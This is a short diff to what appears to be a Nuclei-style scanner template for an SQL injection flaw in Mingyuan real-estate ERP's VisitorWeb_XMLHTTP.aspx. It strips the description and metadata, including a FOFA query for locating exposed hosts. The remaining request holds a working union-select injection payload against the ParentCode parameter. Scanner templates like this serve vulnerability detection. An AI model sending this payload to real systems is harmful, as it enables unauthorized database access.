@@ -3,12 +3,8 @@ info:
   name: 明源地产ERP VisitorWeb_XMLHTTP.aspx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gxrquz21h4rquieg'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gxrquz21h4rquieg
-    fofa: body="/_common/scripts/md5-min.js"
 http:
 - raw:
   - 'GET /CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=1''+union+select+@@version--+c HTTP/1.1
